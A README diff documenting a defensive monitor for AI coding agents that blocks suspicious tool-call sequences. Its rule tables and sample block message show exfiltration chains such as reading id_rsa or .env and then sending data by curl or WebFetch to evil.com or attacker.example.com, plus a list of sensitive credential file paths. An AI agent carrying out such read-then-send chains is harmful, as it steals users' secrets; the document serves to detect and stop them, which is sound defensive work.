@@ -260,6 +260,90 @@ CloneGuard includes an MCP Gateway guardrail plugin (`cloneguard.mcp_plugin`) th
 
 The gateway plugin covers MCP-based tool calls regardless of the agent, but does not cover native file/shell operations (which require agent-specific hooks). Use both for defense in depth.
 
+## CaMeL-lite Tool Call Monitor
+
+CloneGuard monitors tool-call sequences within a session for suspicious behavioral patterns — multi-step attack chains that no single tool call reveals. This is the runtime counterpart to Layer 0's static scanning: Layer 0 catches payloads in files, CaMeL-lite catches payloads in action.
+
+Some rules **enforce** (exit code 2 = block), others are **advisory** (log only). This distinction reflects confidence levels — enforcing rules target high-confidence exfiltration and persistence chains with low false-positive risk.
+
+### Enforcing Rules (Block)
+
+These rules produce exit code 2 and halt the agent:
+
+| Rule | Trigger | What It Catches |
+|------|---------|-----------------|
+| **SEQ-001** | Sensitive file read → `WebFetch` to external URL | Read `.env` then fetch `https://evil.com/?d=...` |
+| **SEQ-002** | Sensitive file read → Bash `curl`/`wget` to external URL | Read `id_rsa` then `curl https://evil.com` |
+| **SEQ-005** | Write to agent config or pkg/git config → build command | Write `.vscode/settings.json` then `npm install` (persistence + execution) |
+
+**SEQ-005 protected paths:**
+- Agent config: `.vscode/settings.json`, `.claude/settings.json`, `.cursor/mcp.json`, `.windsurf/settings.json`, `.gemini/settings.json`, `mcp*.json`
+- Package/git config: `.npmrc`, `.pypirc`, `.gitconfig`, `.git/config`
+
+### Advisory Rules (Log Only)
+
+These rules log to `~/.cloneguard/monitor.log` but do not block:
+
+| Rule | Trigger | What It Catches |
+|------|---------|-----------------|
+| **SEQ-003** | Same MCP tool called >5 times in 10 events | Automated enumeration or brute-force tool abuse |
+| **SEQ-004** | Build file write → build command | Legitimate dev workflow, but worth logging |
+| **SEQ-006** | Sensitive file read → MCP tool with exfil-capable name | Read secrets then call `send`, `post`, `upload`, `email`, `push`, etc. |
+
+### Sensitive File Patterns
+
+CaMeL-lite considers a file read "sensitive" if the path matches any of these patterns:
+
+`.env`, `secret`, `credential`, `password`, `token`, `.ssh/`, `id_rsa`, `id_ed25519`, `.aws/`, `.azure/`, `.kube/`, `.docker/config`, `.netrc`, `.pgpass`, `kubeconfig`, `service_account`, `private_key`, `.pem`, `.key`, `api_key`, `auth.json`, `application_default_credentials`
+
+### What a Block Looks Like
+
+When an enforcing rule triggers, the agent sees:
+
+```
+[CloneGuard] BLOCKED by SEQ-001: Sensitive file read followed by WebFetch to external URL
+  Trigger: Read .env → WebFetch https://attacker.example.com/collect
+  To allowlist this domain: cloneguard sequence-allow SEQ-001 attacker.example.com
+```
+
+The agent receives exit code 2 and cannot proceed past this point.
+
+### Sequence Allowlist
+
+Legitimate workflows sometimes match enforcing rules — for example, reading credentials to call a company vault. The sequence allowlist handles this:
+
+```bash
+# Allow SEQ-001/SEQ-002 for a specific domain
+cloneguard sequence-allow SEQ-001 vault.company.com
+cloneguard sequence-allow SEQ-002 vault.company.com
+
+# Allow SEQ-005 for a specific config file
+cloneguard sequence-allow SEQ-005 .vscode/settings.json
+```
+
+- **SEQ-001 and SEQ-002** use domain-level allowlisting — any URL to the allowed domain passes.
+- **SEQ-005** uses exact-path allowlisting — only the specified config file is permitted.
+- Allowlist entries are stored in `~/.cloneguard/sequence_allowlist.json`, outside the repo.
+
+### Log File
+
+All alerts — both enforcing and advisory — are written to `~/.cloneguard/monitor.log` in JSONL format (one JSON object per line). Review this log to understand what CaMeL-lite is seeing across sessions:
+
+```bash
+# Recent alerts
+tail -20 ~/.cloneguard/monitor.log
+
+# Filter by rule
+grep '"rule":"SEQ-003"' ~/.cloneguard/monitor.log
+```
+
+### Key Files
+
+| File | Purpose |
+|------|---------|
+| `~/.cloneguard/monitor.log` | JSONL alert log (all rules) |
+| `~/.cloneguard/sequence_allowlist.json` | Enforcement allowlist |
+
 ## Example Workflows
 
 ### Reviewing an External PR
